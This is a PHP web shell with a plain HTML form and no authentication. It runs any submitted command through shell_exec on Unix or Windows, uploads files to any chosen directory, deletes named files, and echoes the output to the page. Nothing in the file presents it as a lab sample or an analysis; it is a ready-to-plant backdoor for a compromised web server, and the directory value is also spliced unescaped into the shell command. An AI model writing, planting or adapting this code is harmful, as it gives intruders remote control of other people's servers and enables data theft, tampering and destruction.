<?php
$cwd = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
$output = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['execute_commands'])) {
        $cmd = $_POST['execute_commands'];
        $output .= "<pre>";
        
        
        if (DIRECTORY_SEPARATOR == '/') {
            $output .= executeCommand($cwd, $cmd);
        } else {
            $output .= executeCommandWindows($cwd, $cmd);
        }
        
        $output .= "</pre>";
    }

    if (isset($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
        $output .= uploadFile($cwd, $_FILES['upload']);
    }

    if (isset($_POST['delete'])) {
        $fileToDelete = $_POST['delete'];
        $output .= deleteFile($cwd, $fileToDelete);
    }

}

function executeCommand($cwd, $cmd) {
    return shell_exec('cd "' . $cwd . '" && ' . $cmd . ' 2>&1');
}

function executeCommandWindows($cwd, $cmd) {
    return shell_exec('cd /d "' . $cwd . '" && ' . $cmd . ' 2>&1');
}

function uploadFile($cwd, $file) {
    $dest = $cwd . DIRECTORY_SEPARATOR . $file['name'];
    
    if (move_uploaded_file($file['tmp_name'], $dest)) {
        return "Uploaded file successfully.";
    } else {
        return "Failed to upload file.";
    }
}

function deleteFile($cwd, $fileToDelete) {
    $filePath = $cwd . DIRECTORY_SEPARATOR . $fileToDelete;
    
    if (file_exists($filePath) && is_file($filePath)) {
        if (unlink($filePath)) {
            return "Deleted file successfully.";
        } else {
            return "Failed to delete file.";
        }
    }
}
?>




<form method="post" enctype="multipart/form-data" style="width: 400px; margin: 0 auto; border: 1px solid #ccc; border-radius: 4px; background-color: #f5f5f5; padding: 20px;">
        <div style="margin-bottom: 10px;">
            <label for="file" style="display: block; font-weight: bold;">Upload File:</label>
            <input type="file" id="file" name="upload" style="width: 100%; padding: 5px;">
        </div>
        <div style="margin-bottom: 10px;">
            <label for="delete" style="display: block; font-weight: bold;">Delete File:</label>
            <input type="text" id="delete" name="delete" style="width: 100%; padding: 5px;">
        </div>
        <div style="margin-bottom: 10px;">
            <label for="command" style="display: block; font-weight: bold;">Execute Command:</label>
            <input type="text" id="command" name="execute_commands" style="width: 100%; padding: 5px;">
        </div>

        <div style="text-align: center;">
            <input type="submit" value="Execute" style="margin-top: 10px;">
        </div>

        </form>

<hr />

<?php echo $output; ?>
